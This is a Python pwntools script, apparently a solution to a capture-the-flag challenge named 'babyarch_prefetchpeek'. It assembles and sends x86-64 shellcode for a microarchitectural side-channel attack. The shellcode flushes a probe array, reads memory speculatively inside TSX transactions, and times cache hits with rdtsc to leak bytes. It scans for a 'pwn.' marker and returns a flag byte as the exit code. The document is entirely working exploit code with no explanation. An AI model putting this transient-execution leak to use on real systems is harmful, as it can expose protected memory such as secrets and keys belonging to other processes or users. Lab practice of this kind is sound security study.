from pwn import *
context(os='linux', arch='amd64',log_level='debug')
p=process("/challenge/babyarch_prefetchpeek")
idx=4
shellcode=f'''
start:
    mov r15,0x13333372000   
    mov r14,0x13333371000 
    mov r13, 0x10000               

main_loop:
    xor rbx, rbx                    
    
byte_loop:
    mov ecx, 256
.flush:
    dec ecx
    shl ecx,12
    clflush [r15 + rcx]
    shr ecx,12
    jnz .flush
    mfence
    
    mov rdi, r13
    add rdi, rbx                 
    
    xbegin .tsx_abort                
    movzx eax, byte ptr [rdi]           
    shl eax, 12                    
    mov ecx, [r15 + rax]              
    xend                       
    
.tsx_abort:
    call measure_cache
    cmp al,255
    je byte_loop
    cmp rbx,{idx}
    je exit_success
    mov [r14 + rbx], al
    
    inc rbx
    cmp rbx, 4                   
    jb byte_loop
    
    mov eax, [r14]
    cmp eax, 0x2e6e7770                     
    je get_flag_byte
    
next_addr:
    add r13, 0x10000
    jmp main_loop
    
    xor rdi, rdi
    mov rax, 60
    syscall

get_flag_byte:
    mov rbx,{idx}
    jmp byte_loop

measure_cache:
    push rbx
    push r12
    push r13
    
    xor r12, r12
    mov r13d, 0xFFFFFFFF
    
    mov ecx, 256
    
.loop:
    dec ecx
    shl rcx,12
    mfence
    lfence
    rdtsc
    mov rbx, rax
    mov eax, [r15 + rcx]
    mfence
    lfence
    rdtsc
    shr rcx,12
    sub rax, rbx
    cmp eax, r13d
    jae .next   
    mov r13d, eax
    mov r12b, cl
    
.next:
    jnz .loop
    cmp r13,150
    ja .fail
    mov al, r12b
    jmp .done
.fail:
    mov al, 255
.done:
    pop r13
    pop r12
    pop rbx
    ret

exit_success:
    mov rdi,rax
    mov rax, 60
    syscall

'''
print(shellcode)
shellcode=asm(shellcode)
print(len(shellcode))
p.sendafter("stdin.\n",shellcode)
p.wait()
print(p.poll())
